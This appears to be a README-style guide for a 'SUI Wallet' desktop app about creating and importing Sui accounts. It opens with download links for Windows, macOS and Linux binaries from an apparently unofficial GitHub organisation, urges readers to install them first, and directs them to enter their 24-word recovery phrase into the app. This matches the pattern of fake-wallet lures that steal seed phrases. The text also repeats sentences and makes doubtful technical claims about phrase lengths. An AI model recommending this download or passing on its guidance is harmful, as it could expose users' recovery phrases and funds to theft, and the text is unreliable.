![SUI Wallet](assets/banner-article.png)

# Importing an existing Sui account

Import brings an account in; creating does not touch what is already there.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Two things are being asked here and they have different answers. Creating an account takes one screen and
writes down 24 words; importing an existing one takes the same 24 words and produces the account they
describe. This wallet takes 24-word phrases, so a 12-word phrase from another tool is not something it can
restore.

## Creating one, in order

Install the current release, open it, and choose to create a new account. The application generates 24 words, asks you to write them down, then asks you to confirm a few out of order. That confirmation is the step worth slowing down for.

The confirmation is the part worth slowing down for. It is the only step that proves the paper copy is
complete before the account holds anything, and it is much cheaper to repeat now than to discover a missing
word later. [Creating a new SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/creating-a-new-sui-wallet.md) covers that flow screen by screen.

Two habits make that screen easier. Write the words in order, numbered, on one sheet rather than in two halves; and keep the sheet in a place that is not the machine holding the wallet. The confirmation step is where a missing word is cheap, and where a photograph of a screen is not a backup.

## What importing actually does

Importing is not a transfer and not a connection. There is no server holding your account to link to: the phrase is the account, and entering it recomputes the address and its keys on this machine, which is why it works with the network off.

That is why an import is instant and why it works with the network switched off. Nothing is being fetched
except the balance, which arrives from the chain afterwards.

## The 12-word and 24-word difference

Phrase length is not a setting. This wallet uses 24 words, and 24 words encode a different secret from 12.
A 12-word phrase from another tool is therefore not a shortened version of what this wallet expects; it
describes an account this derivation does not produce.

That is a fact worth knowing before an import rather than after it. The safer route for a 12-word account is
to send its balance to an address this wallet created, with the phrase for that account written down first.

## Can I import from another Sui wallet?

Yes, when the other wallet's backup is a 24-word phrase for an ordinary account. Export it from the other tool, restore it here, and the same address appears with the same balance, because the phrase is the account. Preferences and labels do not come across.

What does not survive is anything that was not in the phrase: staking history is on the chain and returns
with the address, while preferences, labels and the other tool's local settings do not come across.
[migrating from a Sui browser wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/migrating-from-a-sui-browser-wallet.md) covers a move from a browser wallet, including what stays
behind.

## The key scheme question

Accounts come in more than one key type, and a phrase describes an account of a particular kind. A backup
whose account used a different scheme will restore into a different address here, and both addresses are
real - one holds the balance you expect and the other does not.

If an import produces an unfamiliar address, this is the likely explanation, and the fix is not to keep
importing. It is to check what the source tool's account was, and to move the balance deliberately rather
than hoping the derivation matches.

There is no screen that resolves this for you, which is why the answer is procedural rather than technical: establish what the source account was before importing, and if you cannot, move the balance to an address this wallet created instead of hoping two derivations agree.

## Connecting to a site instead of importing

A site asking you to connect is not asking for a phrase. It asks the wallet for an address and a signature, and the wallet answers without revealing anything that could rebuild the account, which is the whole difference between connecting and handing over.

Anything that asks for the 24 words is not connecting to you; it is taking the account. That distinction is
the whole of [Connecting SUI Wallet to a dApp](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/connecting-sui-wallet-to-a-dapp.md) and it is worth reading before the first site asks.

## Which release to import on

The current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), because the
reported problems are fixed there and an import is exactly the moment a fixed bug matters most. The
[repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) records the changes between
releases if you want to know what was fixed.

## FAQ

### Can I import a seed phrase from another Sui wallet?

Yes, if it is a 24-word phrase for an ordinary account. Restore it here and the same address appears; the
balance follows from the chain rather than from the import.

### Does the wallet support accounts using the secp256k1 scheme?

Accounts of a different key type restore into a different address rather than failing, so an import of one
produces a real account that is not the one you meant. Check the source account's type before importing.

### How can I connect my existing wallet?

Enter its 24 words at restore, or send the balance to an address created here. Connecting to a site is a
different action and never involves the phrase.

### Can I have more than one account?

Yes. Additional accounts are created or imported on the same machine, and the phrase for each one is the
backup for that one only.

### What do I do with a 12-word phrase?

Not enter it here. Send that account's balance to an address this wallet created, and keep the 24 words for
the new account on paper.

### Does importing cost anything?

No. It is a local computation; the only network traffic afterwards is reading the balance.
